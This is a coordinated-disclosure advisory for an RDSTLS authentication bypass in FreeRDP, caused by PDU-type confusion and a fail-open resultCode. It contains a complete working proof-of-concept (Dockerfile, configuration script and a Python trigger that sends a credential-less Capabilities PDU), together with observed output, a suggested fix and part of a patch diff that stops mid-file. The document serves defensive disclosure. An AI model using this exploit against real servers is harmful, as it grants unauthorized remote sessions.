<!-- source: https://red.anthropic.com/2026/cvd/findings/ANT-2026-TVG98XT0 -->

# ANT-2026-TVG98XT0 · freerdp/freerdp

## auth-bypass high

[CVE-2026-73241](https://nvd.nist.gov/vuln/detail/CVE-2026-73241)
[GHSA-rqgv-grx4-xm6x](https://github.com/FreeRDP/FreeRDP/security/advisories/GHSA-rqgv-grx4-xm6x)

Maintainer -

Anthropic's analysis, sealed at approval. Disclosure to the maintainer was performed by Ada Logics.

# ANT-2026-TVG98XT0: RDSTLS server authentication bypass via PDU-type confusion

In FreeRDP's RDSTLS server handshake, rdstls\_recv() (rdstls.c:719) dispatches solely on the wire pduType with no check of peer role or handshake state. The rdpRdstls struct is calloc-allocated, so resultCode starts at 0 == RDSTLS\_RESULT\_SUCCESS. A client that replies to the server's Capabilities PDU with another Capabilities PDU (or an AUTHRSP) instead of an Authentication Request is routed to a handler that returns TRUE without touching resultCode. rdstls\_server\_authenticate() (rdstls.c:935) then sends AUTHRSP(SUCCESS) and returns authenticated, never evaluating the password or redirection GUID/cookie. A remote attacker thus obtains a full RDP session on any FreeRDP-based server/proxy with RdstlsSecurity enabled.

**Project:** freerdp/freerdp
**Location:** `libfreerdp/core/rdstls.c:719`

Root cause is a fail-open default combined with missing state validation: rdstls\_new() calloc-zeroes resultCode to RDSTLS\_RESULT\_SUCCESS, and rdstls\_recv() switches purely on attacker-supplied pduType without consulting rdstls->state or rdstls->server. The state-transition checker only validates the server's own fixed sequence, so an unexpected inbound PDU type is silently accepted and the credential-verification path is skipped entirely.

1. Connect and negotiate PROTOCOL\_RDSTLS at X.224, complete TLS.
2. Receive the server's RDSTLS Capabilities PDU.
3. Reply with an 8-byte RDSTLS\_TYPE\_CAPABILITIES PDU (version=1,type=1,dataType=1,versions=1) instead of an Authentication Request (alternatively send RDSTLS\_TYPE\_AUTHRSP with resultCode=0).
4. rdstls\_recv() routes it to rdstls\_process\_capabilities(), which returns TRUE without touching resultCode.
5. Server transitions AUTH\_REQ→AUTH\_RSP, sends AUTHRSP(resultCode=0=SUCCESS), and rdstls\_server\_authenticate() returns 1.
6. Connection advances to CONNECTION\_STATE\_MCS\_CREATE\_REQUEST with the session marked authenticated; proceed with a full RDP session.

## Suggested Fix

Make the RDSTLS server state machine accept only an Authentication Request PDU at the authentication step (reject any other pduType in rdstls\_recv when server && state==AUTH\_REQ), and fail closed: initialise resultCode to a denial value and only set SUCCESS after explicit credential verification.

This vulnerability was discovered by Claude, Anthropic's AI assistant, and triaged by the Anthropic security team in collaboration with Anthropic Research. Please direct questions to security-cvd@anthropic.com and reference ANT-2026-TVG98XT0.

---

**Reference:** ANT-2026-TVG98XT0

Triage and disclosure were performed by Ada Logics. The writeup below is the document the firm sent to the maintainer.

# RDSTLS server authentication bypass: a credential-less Capabilities PDU is accepted at the auth step (fail-open `resultCode`)

This is

## Summary

FreeRDP's server-side RDSTLS handshake dispatches inbound PDUs purely on the
attacker-supplied wire `pduType`, without checking that the PDU is the one the
protocol requires at the current step. The `rdpRdstls` object is `calloc`-zeroed,
so its `resultCode` starts at `0` — which is exactly `RDSTLS_RESULT_SUCCESS`.

At the point where the server is waiting for the client's Authentication
Request (the PDU that carries the credentials), a client may instead send a
Capabilities PDU. `rdstls_recv()` routes it to `rdstls_process_capabilities()`,
which validates a couple of constant fields and returns `TRUE` without ever
setting `resultCode`. The state machine advances, the server sends an
`AUTHRSP` carrying the still-zero `resultCode` (SUCCESS), and
`rdstls_server_authenticate()` returns "authenticated" having never evaluated a
password, redirection GUID, or auto-reconnect cookie.

The result is a pre-credential authentication bypass on any
FreeRDP-based server/proxy that enables RDSTLS: an unauthenticated remote client
reaches a session the server has marked authenticated.

Importantly, this bypasses a credential check that does run in the normal
flow: when a client sends a proper `RDSTLS_TYPE_AUTHREQ`,
`rdstls_process_authentication_request_with_password()` compares the client's
RedirectionGuid / username / domain / password against the server's configured
values and sets `resultCode` to `ACCESS_DENIED` / `LOGON_FAILURE` on a mismatch.
The attack simply never reaches that function. The proof-of-concept below
demonstrates exactly this: the same server that rejects a wrong RedirectionGuid
with `ACCESS_DENIED` accepts a credential-less Capabilities PDU as `SUCCESS`.

## Affected versions

* **FreeRDP `master`** — reproduced on HEAD
  `5e8e987b469b60a3bafadf8f5afc40f91c09f458` on 2026-07-14. The dispatch is at
  `libfreerdp/core/rdstls.c:809`, the `calloc` fail-open default at `:122`
  (`RDSTLS_RESULT_SUCCESS = 0` at `:61`), and the success gate in
  `rdstls_server_authenticate()` at `:1025`. Unpatched.
* **FreeRDP 3.x** — the same defect is present in the released 3.x series (e.g.
  tag 3.27.1). Because the defect ships in a released tag (not development-branch
  only), it qualifies for a CVE under the project's supported-versions policy.
* Reachable when the server is configured with `RdstlsSecurity = TRUE` (a
  non-default but legitimate deployment setting).

## Details

All line numbers below are at `master` HEAD
`5e8e987b469b60a3bafadf8f5afc40f91c09f458`.

### The credential check that normally runs

When the client sends the required `RDSTLS_TYPE_AUTHREQ`, the server performs a
real credential comparison (`libfreerdp/core/rdstls.c:570`):

```
// rdstls_process_authentication_request_with_password()
rdstls->resultCode = RDSTLS_RESULT_SUCCESS;                    // :607

if (!rdstls_cmp_data(rdstls->log, "RedirectionGuid", serverRedirectionGuid,
                     serverRedirectionGuidLength, clientRedirectionGuid,
                     clientRedirectionGuidLength))              // :609
    rdstls->resultCode = RDSTLS_RESULT_ACCESS_DENIED;
if (!rdstls_cmp_str(rdstls->log, "UserName", serverUsername, clientUsername))  // :614
    rdstls->resultCode = RDSTLS_RESULT_LOGON_FAILURE;
if (!rdstls_cmp_str(rdstls->log, "Domain", ...))              // :617
    rdstls->resultCode = RDSTLS_RESULT_LOGON_FAILURE;
if (!rdstls_cmp_str(rdstls->log, "Password", ...))            // :620
    rdstls->resultCode = RDSTLS_RESULT_LOGON_FAILURE;
```

`rdstls_cmp_data` (`:524`) and `rdstls_cmp_str` (`:547`) are genuine
`memcmp`/`strcmp` checks that fail closed on a mismatch. So a wrong credential
yields `ACCESS_DENIED`/`LOGON_FAILURE`, and `rdstls_server_authenticate()`
returns failure.

### The fail-open default

The object is zero-initialised, so `resultCode == RDSTLS_RESULT_SUCCESS` before
any credential is checked:

```
// rdstls.c:61
    RDSTLS_RESULT_SUCCESS = 0x00000000,
// rdstls.c:122 — rdstls_new()
    rdpRdstls* rdstls = (rdpRdstls*)calloc(1, sizeof(rdpRdstls));   // resultCode = 0 = SUCCESS
```

### The dispatch that skips the check

The receive path dispatches on the wire `pduType` with no check that this is the
PDU required at the current step:

```
// rdstls.c:808 — rdstls_recv() (shared by client and server)
    const UINT16 pduType = Stream_Get_UINT16(s);                    // :808
    switch (pduType)                                                // :809 — wire byte only
        case RDSTLS_TYPE_CAPABILITIES:
            if (!rdstls_process_capabilities(rdstls, s))            // returns TRUE, never sets resultCode
                return -1;
            break;
        case RDSTLS_TYPE_AUTHREQ:
            if (!rdstls_process_authentication_request(rdstls, s))  // the ONLY path that sets resultCode
                return -1;
            break;
        case RDSTLS_TYPE_AUTHRSP:
            ...
    return 1;
```

`rdstls_process_capabilities()` (`:447`) validates constant fields and returns
`TRUE`/`FALSE` — it never writes `resultCode`.

The server auth routine accepts whatever `rdstls_recv` returns, then gates solely
on `resultCode`:

```
// rdstls.c:1009 — rdstls_server_authenticate()
    if (!rdstls_send_capabilities(rdstls))            return -1;
    if (!rdstls_recv_authentication_request(rdstls))  return -1;   // accepts a CAPABILITIES PDU
    if (!rdstls_send_authentication_response(rdstls)) return -1;   // emits AUTHRSP(resultCode)
    if (rdstls->resultCode != RDSTLS_RESULT_SUCCESS)  return -1;   // :1025  0 == SUCCESS -> passes
    return 1;                                                      // authenticated
```

`rdstls_recv_authentication_request()` (`:874`) checks only the *server's own*
outbound state, then calls `rdstls_recv()`, which trusts the inbound `pduType`. A
`RDSTLS_TYPE_CAPABILITIES` PDU is therefore accepted in place of the
credential-bearing `RDSTLS_TYPE_AUTHREQ`, the credential-comparison function above
is never invoked, `resultCode` stays at its `calloc`-zeroed `SUCCESS`, and the
gate at `:1025` passes.

### Root cause

Two compounding defects: (1) **fail-open default** — `resultCode` is initialised
to the success value; (2) **missing state/role validation** — the dispatcher does
not require an `AUTHREQ` at the authentication step.

### Server-side call path

```
rdp_server_accept_nego                                   libfreerdp/core/connection.c
  (RdstlsSecurity -> select PROTOCOL_RDSTLS)
  transport_accept_rdstls  (TLS accept)                  libfreerdp/core/transport.c
    rdstls_new (server=TRUE, resultCode=0)               rdstls.c:122
    rdstls_server_authenticate                           rdstls.c:1009
      rdstls_send_capabilities                           (server -> client)
      rdstls_recv_authentication_request -> rdstls_recv  rdstls.c:874 / :808
        attacker sends RDSTLS_TYPE_CAPABILITIES -> rdstls_process_capabilities (resultCode untouched)  rdstls.c:447
      rdstls_send_authentication_response  -> AUTHRSP(resultCode=0=SUCCESS)
      resultCode == SUCCESS -> return 1 (authenticated)  rdstls.c:1025
```

## Impact

On a FreeRDP-based server/proxy with RDSTLS enabled, an unauthenticated remote
attacker completes the RDSTLS authentication step without presenting any
credential, and the connection advances (marked authenticated) to MCS. No
password, redirection GUID, or auto-reconnect cookie is ever checked.

Workaround until patched: do not enable `RdstlsSecurity` (the default), or add a
secondary authentication gate in the server's `Logon` callback (note
`IFCALLRESULT` defaults to TRUE, so a missing callback does not mitigate).

## Proof of Concept

A self-contained Docker reproducer builds the shipped FreeRDP sample server
(`sfreerdp-server`) at the affected commit and runs **three RDSTLS connections
against the same server**, each reaching the authentication step and sending a
different PDU:

1. **Positive control** — a proper `AUTHREQ` carrying the *correct*
   RedirectionGuid → server returns `SUCCESS` (the auth path works).
2. **Negative control** — a proper `AUTHREQ` carrying a *wrong* RedirectionGuid →
   server returns `ACCESS_DENIED` (the server genuinely enforces the credential).
3. **Attack** — a credential-less `CAPABILITIES` PDU at the auth step → server
   returns `SUCCESS` (the bypass).

The positive/negative controls prove the server is really authenticating; the
attack, under the identical server configuration, shows the credential-less PDU
being accepted anyway.

### A note on the server configuration (the target is not modified)

The shipped sample server hardcodes its security protocols in `test_peer_init()`
and exposes **no** command-line flag to change them. The reproducer therefore sets
two supported *deployment* settings in `server/Sample/sfreerdp.c` (via
`configure_server.py`): `RdstlsSecurity = TRUE` (so the server negotiates RDSTLS,
default FALSE) and a 16-byte `RedirectionGuid` (so the server has a credential to
enforce, enabling the negative control). This represents an administrator who
deploys RDSTLS redirection. **The vulnerable code in
`libfreerdp/core/rdstls.c` is built and run completely unmodified.**

### Build & run

```
docker build -t frdp-rdstls-bypass .
docker run --rm frdp-rdstls-bypass
```

### Observed output (master HEAD `5e8e987b`, 2026-07-14)

```
----- POSITIVE control: AUTHREQ + CORRECT RedirectionGuid -----
[*] server Capabilities PDU: 0100010001000100
[*] -> sending auth-step PDU (30 bytes): 01000200010010000102030405060708090a0b0c0d0e0f10000000000000
[*] <- AUTHRSP pduType=0x0004 resultCode=SUCCESS

----- NEGATIVE control: AUTHREQ + WRONG RedirectionGuid -----
[*] server Capabilities PDU: 0100010001000100
[*] -> sending auth-step PDU (30 bytes): 0100020001001000aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa000000000000
[*] <- AUTHRSP pduType=0x0004 resultCode=ACCESS_DENIED

----- ATTACK: credential-less CAPABILITIES PDU -----
[*] server Capabilities PDU: 0100010001000100
[*] -> sending auth-step PDU (8 bytes): 0100010001000100
[*] <- AUTHRSP pduType=0x0004 resultCode=SUCCESS

========================================================================
RDSTLS authentication result matrix (same server, RedirectionGuid configured):
  positive (correct credential)  -> SUCCESS         expect SUCCESS
  negative (wrong credential)    -> ACCESS_DENIED   expect ACCESS_DENIED
  ATTACK   (no credential)       -> SUCCESS         expect (secure) rejection
========================================================================
VULNERABLE: the server REJECTS a wrong RedirectionGuid (ACCESS_DENIED) but
            ACCEPTS a credential-less Capabilities PDU as SUCCESS.
            Real RDSTLS authentication is bypassed via PDU-type confusion.
```

The server log (from the negative control) confirms the credential check runs:
`[ERROR][com.freerdp.core.rdstls] - [rdstls_cmp_data]: RedirectionGuid
verification failed` → `[transport_accept_rdstls]: client authentication failure`.

### Complete reproducer files

Place the following four files in one directory and run the build/run commands
above.

#### `Dockerfile`

```
FROM ubuntu:24.04
ENV DEBIAN_FRONTEND=noninteractive

# Pinned commit: current upstream HEAD of the default branch.
ARG TARGET_COMMIT=5e8e987b469b60a3bafadf8f5afc40f91c09f458
ARG CLANG_VERSION=20

RUN apt-get update && apt-get install -y --no-install-recommends \
        ca-certificates git cmake ninja-build pkg-config make \
        libssl-dev zlib1g-dev openssl python3 \
        wget gnupg lsb-release software-properties-common \
    && wget -qO /tmp/llvm.sh https://apt.llvm.org/llvm.sh && chmod +x /tmp/llvm.sh && /tmp/llvm.sh ${CLANG_VERSION} \
    && apt-get install -y --no-install-recommends clang-${CLANG_VERSION} llvm-${CLANG_VERSION} libclang-rt-${CLANG_VERSION}-dev \
    && rm -rf /var/lib/apt/lists/*

ENV CC=clang-20 CXX=clang++-20

# Cacheable clone, then a separate checkout so the build can be re-pinned to any commit via --build-arg TARGET_COMMIT.
RUN git clone https://github.com/FreeRDP/FreeRDP /src/repo
WORKDIR /src/repo
RUN git checkout ${TARGET_COMMIT}

# Deployment configuration only (does NOT touch the vulnerable libfreerdp/core/rdstls.c):
# enable the default-FALSE RdstlsSecurity setting so the sample server negotiates RDSTLS,
# and configure a RedirectionGuid so the server has a real credential to enforce (lets the
# reproducer show a wrong-credential rejection next to the credential-less bypass).
COPY configure_server.py /tmp/configure_server.py
RUN python3 /tmp/configure_server.py \
    && grep -nE "FreeRDP_RdstlsSecurity, TRUE|FreeRDP_RedirectionGuid" server/Sample/sfreerdp.c

# Logic/auth bug -> ASan not required. Build the server + sample server only.
RUN cmake -GNinja -B /opt/build -S /src/repo \
        -DCMAKE_BUILD_TYPE=Debug \
        -DWITH_SERVER=ON -DWITH_SAMPLE=ON \
        -DWITH_CLIENT=OFF -DWITH_CLIENT_COMMON=OFF -DWITH_CLIENT_SDL=OFF \
        -DWITH_X11=OFF -DWITH_WAYLAND=OFF -DWITH_SHADOW=OFF -DWITH_PLATFORM_SERVER=OFF \
        -DWITH_MANPAGES=OFF -DBUILD_TESTING=OFF -DWITH_SAMPLE_SERVER=ON \
        -DWITH_FFMPEG=OFF -DWITH_SWSCALE=OFF -DWITH_DSP_FFMPEG=OFF \
        -DWITH_CAIRO=OFF -DWITH_PCSC=OFF -DWITH_CUPS=OFF -DWITH_PULSE=OFF \
        -DWITH_ALSA=OFF -DWITH_OSS=OFF -DWITH_FUSE=OFF -DWITH_KRB5=OFF \
    && ninja -C /opt/build sfreerdp-server

RUN mkdir -p /opt/server
COPY trigger.py /opt/trigger.py
COPY run.sh /opt/run.sh
RUN chmod +x /opt/run.sh

CMD ["/bin/sh","-c","/opt/run.sh; echo DONE=$?"]
```

#### `configure_server.py`

```
#!/usr/bin/env python3
"""
Deployment configuration for the shipped FreeRDP sample server (sfreerdp-server).

The sample server hardcodes its security protocols in test_peer_init() and exposes
NO command-line flag to change them, so this script edits two *deployment settings*
into server/Sample/sfreerdp.c:

  1. FreeRDP_RdstlsSecurity = TRUE      -> the server negotiates RDSTLS (default FALSE)
  2. FreeRDP_RedirectionGuid = <16 bytes> -> the server has a real credential to enforce,
     so rdstls_process_authentication_request_with_password() actually rejects a wrong
     RedirectionGuid (rdstls_cmp_data / ACCESS_DENIED). This lets the reproducer show a
     negative control (wrong credential -> rejected) next to the bypass.

This does NOT touch the vulnerable code in libfreerdp/core/rdstls.c; it only configures
the server the way an administrator deploying RDSTLS redirection would.
"""
import re
import sys
import pathlib

SRC = pathlib.Path("server/Sample/sfreerdp.c")
text = SRC.read_text()

# Anchor: the existing NlaSecurity=FALSE settings line in test_peer_init().
anchor = re.compile(
    r'(if \(!freerdp_settings_set_bool\(settings, FreeRDP_NlaSecurity, FALSE\)\)\s*\n\s*goto fail;\n)'
)

inject = (
    "\t/* --- reproducer deployment config (does NOT touch libfreerdp/core/rdstls.c) --- */\n"
    "\tif (!freerdp_settings_set_bool(settings, FreeRDP_RdstlsSecurity, TRUE))\n"
    "\t\tgoto fail;\n"
    "\t{\n"
    "\t\tstatic const BYTE _repro_guid[16] = {\n"
    "\t\t\t0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,\n"
    "\t\t\t0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10 };\n"
    "\t\tif (!freerdp_settings_set_pointer_len(settings, FreeRDP_RedirectionGuid, _repro_guid, sizeof(_repro_guid)))\n"
    "\t\t\tgoto fail;\n"
    "\t\tif (!freerdp_settings_set_uint32(settings, FreeRDP_RedirectionGuidLength, sizeof(_repro_guid)))\n"
    "\t\t\tgoto fail;\n"
    "\t}\n"
)

new_text, n = anchor.subn(lambda m: m.group(1) + inject, text, count=1)
if n != 1:
    sys.stderr.write("ERROR: could not find the NlaSecurity anchor in sfreerdp.c\n")
    sys.exit(1)

SRC.write_text(new_text)
print("[configure_server] RdstlsSecurity=TRUE + RedirectionGuid(16B) injected into sfreerdp.c")
```

#### `trigger.py`

```
#!/usr/bin/env python3
"""
RDSTLS server authentication bypass via PDU-type confusion.

This driver runs THREE cases against the same stock sfreerdp-server (built with
RDSTLS enabled and a RedirectionGuid credential configured; libfreerdp/core/rdstls.c
is unmodified). Each case is a fresh RDSTLS connection that gets to the server's
authentication step, then sends a different PDU:

  1. POSITIVE control : AUTHREQ(password) carrying the CORRECT RedirectionGuid
                        -> expect resultCode == SUCCESS         (auth path works)
  2. NEGATIVE control : AUTHREQ(password) carrying a WRONG RedirectionGuid
                        -> expect resultCode == ACCESS_DENIED   (server DOES enforce)
  3. ATTACK           : a credential-less CAPABILITIES PDU (PDU-type confusion)
                        -> observed resultCode == SUCCESS        (BYPASS)

RDSTLS wire format (libfreerdp/core/rdstls.c): every PDU is
  UINT16 version(=0x0001) | UINT16 pduType | body   (all little-endian)
"""
import socket
import ssl
import struct
import sys

HOST = "127.0.0.1"
PORT = 3389

PROTOCOL_RDSTLS = 0x04

RDSTLS_VERSION_1 = 0x0001
RDSTLS_TYPE_CAPABILITIES = 0x0001
RDSTLS_TYPE_AUTHREQ = 0x0002
RDSTLS_TYPE_AUTHRSP = 0x0004
RDSTLS_DATA_CAPABILITIES = 0x0001
RDSTLS_DATA_PASSWORD_CREDS = 0x0001

RDSTLS_RESULT_SUCCESS = 0x00000000
RDSTLS_RESULT_ACCESS_DENIED = 0x00000005
RDSTLS_RESULT_LOGON_FAILURE = 0x0000052e

# Must match the RedirectionGuid configure_server.py sets on the server.
EXPECTED_GUID = bytes(range(1, 17))          # 01 02 .. 10
WRONG_GUID = b"\xAA" * 16

def result_str(rc):
    return {
        RDSTLS_RESULT_SUCCESS: "SUCCESS",
        RDSTLS_RESULT_ACCESS_DENIED: "ACCESS_DENIED",
        RDSTLS_RESULT_LOGON_FAILURE: "LOGON_FAILURE",
    }.get(rc, "0x%08x" % rc)

def recvn(sock, n):
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise EOFError("connection closed (got %d/%d bytes)" % (len(buf), n))
        buf += chunk
    return buf

def x224_connection_request(requested_protocols):
    neg = struct.pack("<BBHI", 0x01, 0x00, 0x0008, requested_protocols)
    x224 = struct.pack("<BBHHB", 6 + len(neg), 0xE0, 0x0000, 0x0000, 0x00) + neg
    tpkt = struct.pack(">BBH", 0x03, 0x00, 4 + len(x224)) + x224
    return tpkt

def read_tpkt(sock):
    hdr = recvn(sock, 4)
    assert hdr[0] == 0x03, "not a TPKT response: %r" % hdr
    length = struct.unpack(">H", hdr[2:4])[0]
    return hdr + recvn(sock, length - 4)

def capabilities_pdu():
    # version | CAPABILITIES | dataType=CAPABILITIES | supportedVersions
    return struct.pack("<HHHH", RDSTLS_VERSION_1, RDSTLS_TYPE_CAPABILITIES,
                       RDSTLS_DATA_CAPABILITIES, RDSTLS_VERSION_1)

def authreq_password_pdu(guid):
    # version | AUTHREQ | dataType=PASSWORD_CREDS
    body = struct.pack("<HHH", RDSTLS_VERSION_1, RDSTLS_TYPE_AUTHREQ, RDSTLS_DATA_PASSWORD_CREDS)
    # RedirectionGuid: UINT16 len + bytes
    body += struct.pack("<H", len(guid)) + guid
    # Username / Domain / Password: UINT16 len + UTF-16LE (empty -> len 0)
    body += struct.pack("<H", 0) + struct.pack("<H", 0) + struct.pack("<H", 0)
    return body

def run_case(label, auth_step_pdu):
    """Connect, negotiate RDSTLS + TLS, read the server Capabilities PDU, send the
    given auth-step PDU, and return the server's AUTHRSP resultCode. Returns None if
    the server rejects/closes without an AUTHRSP (the expected secure/fixed behavior
    for the attack case)."""
    print("\n----- %s -----" % label, flush=True)
    try:
        sock = socket.create_connection((HOST, PORT), timeout=15)
        sock.sendall(x224_connection_request(PROTOCOL_RDSTLS))
        cc = read_tpkt(sock)
        if not (len(cc) >= 19 and cc[11] == 0x02 and
                struct.unpack("<I", cc[15:19])[0] == PROTOCOL_RDSTLS):
            print("[!] server did not select RDSTLS; abort", flush=True)
            return None

        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        try:
            ctx.set_ciphers("ALL:@SECLEVEL=0")
        except ssl.SSLError:
            pass
        tls = ctx.wrap_socket(sock, server_hostname=HOST)

        caps = recvn(tls, 8)  # server -> client RDSTLS Capabilities PDU
        print("[*] server Capabilities PDU: %s" % caps.hex(), flush=True)
        print("[*] -> sending auth-step PDU (%d bytes): %s"
              % (len(auth_step_pdu), auth_step_pdu.hex()), flush=True)
        tls.sendall(auth_step_pdu)

        rsp = recvn(tls, 10)  # AUTHRSP = version(2) type(2) dataType(2) resultCode(4)
        ptype = struct.unpack("<H", rsp[2:4])[0]
        result_code = struct.unpack("<I", rsp[6:10])[0]
        try:
            tls.close()
        except OSError:
            pass
        print("[*] <- AUTHRSP pduType=0x%04x resultCode=%s"
              % (ptype, result_str(result_code)), flush=True)
        return result_code
    except (EOFError, OSError, ssl.SSLError) as e:
        # No AUTHRSP: server rejected the PDU and closed the connection.
        print("[*] <- no AUTHRSP; server rejected/closed the connection (%r)" % e, flush=True)
        return None

def main():
    pos = run_case("POSITIVE control: AUTHREQ + CORRECT RedirectionGuid", authreq_password_pdu(EXPECTED_GUID))
    neg = run_case("NEGATIVE control: AUTHREQ + WRONG RedirectionGuid", authreq_password_pdu(WRONG_GUID))
    atk = run_case("ATTACK: credential-less CAPABILITIES PDU", capabilities_pdu())

    def cell(rc):
        return "None" if rc is None else result_str(rc)

    print("\n" + "=" * 72, flush=True)
    print("RDSTLS authentication result matrix (same server, RedirectionGuid configured):", flush=True)
    print("  positive (correct credential)  -> %-14s  expect SUCCESS" % cell(pos), flush=True)
    print("  negative (wrong credential)    -> %-14s  expect ACCESS_DENIED" % cell(neg), flush=True)
    print("  ATTACK   (no credential)       -> %-14s  expect (secure) rejection" % cell(atk), flush=True)
    print("=" * 72, flush=True)

    auth_enforced = (pos == RDSTLS_RESULT_SUCCESS and neg == RDSTLS_RESULT_ACCESS_DENIED)
    bypassed = (atk == RDSTLS_RESULT_SUCCESS)

    if auth_enforced and bypassed:
        print("VULNERABLE: the server REJECTS a wrong RedirectionGuid (ACCESS_DENIED) but", flush=True)
        print("            ACCEPTS a credential-less Capabilities PDU as SUCCESS.", flush=True)
        print("            Real RDSTLS authentication is bypassed via PDU-type confusion.", flush=True)
        print("REPRO_OK", flush=True)
        return 0

    if not auth_enforced:
        print("[!] auth not enforced as expected (positive=%s negative=%s) -> inconclusive"
              % (cell(pos), cell(neg)), flush=True)
    if not bypassed:
        print("[*] attack did NOT bypass (attack=%s) -> looks fixed/rejected" % cell(atk), flush=True)
    print("REPRO_FAIL", flush=True)
    return 1

if __name__ == "__main__":
    try:
        rc = main()
    except Exception as e:  # noqa
        print("[!] trigger error: %r" % e, flush=True)
        rc = 3
    print("TRIGGER_EXIT=%d" % rc, flush=True)
    sys.exit(rc)
```

#### `run.sh`

```
#!/bin/sh
# Start the FreeRDP sample server (RDSTLS enabled) and fire the attacker client.
set -e
cd /opt/server

# Self-signed cert/key for the server's TLS.
if [ ! -f server.crt ]; then
    openssl req -x509 -newkey rsa:2048 -keyout server.key -out server.crt \
        -days 3650 -nodes -subj "/CN=tfreerdp" >/dev/null 2>&1
fi

echo "===== starting tfreerdp-server (RdstlsSecurity=TRUE) ====="
/opt/build/server/Sample/sfreerdp-server --port=3389 --cert=server.crt --key=server.key \
    > /tmp/server.log 2>&1 &
SRV=$!

# wait for the listener
for i in $(seq 1 30); do
    if python3 -c "import socket,sys; s=socket.socket(); s.settimeout(1); sys.exit(0 if s.connect_ex(('127.0.0.1',3389))==0 else 1)" 2>/dev/null; then
        break
    fi
    sleep 0.5
done

echo "===== firing attacker client ====="
python3 /opt/trigger.py
RC=$?

echo
echo "===== server log (tail) ====="
tail -n 40 /tmp/server.log || true

kill $SRV 2>/dev/null || true
echo "EXIT=$RC"
```

## Suggested fix

Reject any PDU other than `RDSTLS_TYPE_AUTHREQ` when the server is at the
authentication step, and initialise `resultCode` to a denial value so SUCCESS is
only reachable after an explicit credential comparison. Either change alone closes
the bypass; both restore fail-closed behaviour.

```
@@ rdstls_new
     rdpRdstls* rdstls = (rdpRdstls*)calloc(1, sizeof(rdpRdstls));
     ...
+    /* fail closed: only an explicit credential check may set SUCCESS */
+    rdstls->resultCode = RDSTLS_RESULT_ACCESS_DENIED;
@@ rdstls_recv (before the switch)
     const UINT16 pduType = Stream_Get_UINT16(s);
+    if (rdstls->server && rdstls->state == RDSTLS_STATE_AUTH_REQ &&
+        pduType != RDSTLS_TYPE_AUTHREQ)
+    {
+        WLog_Print(rdstls->log, WLOG_ERROR,
+                   "RDSTLS server expected AUTHREQ, got pduType 0x%04" PRIx16, pduType);
+        return -1;
+    }
     switch (pduType)
```

We verified this guard against the same reproducer. With the fix applied, the
positive control still returns `SUCCESS` and the negative control still returns
`ACCESS_DENIED` (legitimate authentication is preserved), but the attack no longer
receives an AUTHRSP — `rdstls_recv` returns `-1`, authentication fails, and the
connection is closed:

```
  positive (correct credential)  -> SUCCESS         expect SUCCESS
  negative (wrong credential)    -> ACCESS_DENIED   expect ACCESS_DENIED
  ATTACK   (no credential)       -> None            (server rejected/closed - fixed)
```

## Attribution

This issue was found using AI and agents, and has been reviewed manually. Please
credit **Claude** and **Ada Logics** — found by Anthropic using agents to study
the security of open-source projects, with Ada Logics validating and reporting.
Let us know if you need any more information.

## Disclosure

We follow coordinated disclosure policy here:
https://www.anthropic.com/coordinated-vulnerability-disclosure (90 day deadline).

```
diff --git a/libfreerdp/core/rdstls.c b/libfreerdp/core/rdstls.c
index e076caf75116..313e9eb53a80 100644
--- a/libfreerdp/core/rdstls.c
+++ b/libfreerdp/core/rdstls.c
@@ -33,8 +33,8 @@
 #include "transport.h"
 #include "utils.h"

-#define RDSTLS_VERSION_1 0x01
-#define RDSTLS_VERSION_2 0x02
+#define RDSTLS_VERSION_1 0x01u
+#define RDSTLS_VERSION_2 0x02u

 #define RDSTLS_TYPE_CAPABILITIES 0x01
 #define RDSTLS_TYPE_AUTHREQ 0x02
@@ -77,8 +77,10 @@ struct rdp_rdstls

 	RDSTLS_RESULT_CODE resultCode;
 	wLog* log;
+	uint16_t supportedVersions;
 };

+WINPR_ATTR_NODISCARD
 static const char* rdstls_result_code_str(UINT32 resultCode)
 	switch (resultCode)
@@ -103,6 +105,27 @@ static const char* rdstls_result_code_str(UINT32 resultCode)
 			return "RDSTLS_RESULT_UNKNOWN";
+
+#define rdstls_required_role_is_server(rdstls, isServer) \
+	rdstls_required_role_is_server_((rdstls), (isServer), __FILE__, __func__, __LINE__)
+
+WINPR_ATTR_NODISCARD
+static BOOL rdstls_required_role_is_server_(const rdpRdstls* rdstls, BOOL isServer,
+                                            const char* file, const char* fkt, size_t line)
+{
+	WINPR_ASSERT(rdstls);
+	const BOOL rc = rdstls->server == isServer;
+	if (!rc)
+	{
+		const DWORD level = WLOG_ERROR;
+		if (WLog_IsLevelActive(rdstls->log, level))
+			WLog_PrintTextMessage(rdstls->log, level, line, file, fkt,
+			                      "Message not allowed in current role '%s'",
+			                      rdstls->server ? "server" : "client");
+	}
+	return rc;
+}
+
 /**
  * Create new RDSTLS state machine.
  *
@@ -128,6 +151,7 @@ rdpRdstls* rdstls_new(rdpContext* context, rdpTransport* transport)
 	rdstls->transport = transport;
 	rdstls->server = settings->ServerMode;

+	rdstls->resultCode = RDSTLS_RESULT_ACCESS_DENIED;
 	rdstls->state = RDSTLS_STATE_INITIAL;

 	return rdstls;
@@ -143,6 +167,7 @@ void rdstls_free(rdpRdstls* rdstls)
 	free(rdstls);

+WINPR_ATTR_NODISCARD
 static const char* rdstls_get_state_str(RDSTLS_STATE state)
 	switch (state)
@@ -162,12 +187,14 @@ static const char* rdstls_get_state_str(RDSTLS_STATE state)

+WINPR_ATTR_NODISCARD
 static RDSTLS_STATE rdstls_get_state(rdpRdstls* rdstls)
 	WINPR_ASSERT(rdstls);
 	return rdstls->state;

+WINPR_ATTR_NODISCARD
 static BOOL check_transition(wLog* log, RDSTLS_STATE current, RDSTLS_STATE expected,
                              RDSTLS_STATE requested)
@@ -182,6 +209,7 @@ static BOOL check_transition(wLog* log, RDSTLS_STATE current, RDSTLS_STATE expec
 	return TRUE;

+WINPR_ATTR_NODISCARD
 static BOOL rdstls_set_state(rdpRdstls* rdstls, RDSTLS_STATE state)
 	BOOL rc = FALSE;
@@ -220,18 +248,44 @@ static BOOL rdstls_set_state(rdpRdstls* rdstls, RDSTLS_STATE state)
 	return rc;

+#define rdstls_check_state_requirements(rdstls, expected) \
